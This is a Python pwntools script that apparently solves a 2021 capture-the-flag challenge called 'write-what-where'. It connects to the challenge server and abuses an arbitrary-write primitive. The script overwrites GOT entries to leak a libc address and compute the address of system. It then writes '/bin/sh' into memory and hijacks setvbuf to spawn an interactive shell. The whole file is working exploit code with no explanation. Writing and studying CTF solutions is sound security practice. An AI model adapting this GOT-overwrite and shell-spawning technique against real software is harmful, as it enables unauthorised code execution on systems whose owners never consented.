#!/bin/python3

from pwn import *

OFFSET = 0xd870
HOST = 'pwn-2021.duc.tf'
PORT = 31920

def set32(addr, data):
    io.sendafter(b'what?\n', p32(data))
    io.sendafter(b'where?\n', str(addr).encode())

try:
    #io = process(['./write-what-where'])
    io = remote(HOST, PORT)

    # set exit with main
    set32(0x404038, 0x4011ca)

    # create string /bin/sh at somewhere in bss
    binsh = int.from_bytes(b'/bin/sh', 'little')
    set32(0x404058, binsh & 0xffffffff)
    set32(0x40405c, (binsh >> (8*4)) & 0xffffffff)

    # set setvbuff with puts to leak data
    set32(0x404028, 0x401030)
    set32(0x40402c, 0x0)

    # set stdin with address we wanna leak
    set32(0x404060, 0x404030)
    set32(0x404064, 0x0)

    # leak by running init
    set32(0x404038, 0x4011a9)

    leak = io.recvuntil(b'\n')
    leak = leak.rstrip(b'\n')
    leak = leak + b'\x00'*(8-len(leak))
    leak = u64(leak)
    print('leak atoi addr:', hex(leak))
    sys_addr = leak + OFFSET
    print('system addr:', hex(sys_addr))

    # set exit back to main right after init
    # this will allow to set up with word size
    set32(0x404038, 0x4011ca)

    # set stdin with string pointer
    set32(0x404060, 0x404058)

    # set setvbuf with system
    set32(0x404028, sys_addr & 0xffffffff)
    set32(0x40402c, (sys_addr >> (8*4)) & 0xffffffff)

    # loop once again, we need stack to be align properly
    set32(0x404038, 0x4011ca)
    
    # go to system
    set32(0x404038, 0x4011a9)

    io.interactive()
except EOFError as e:
    io.kill()
except KeyboardInterrupt as e:
    exit(1)
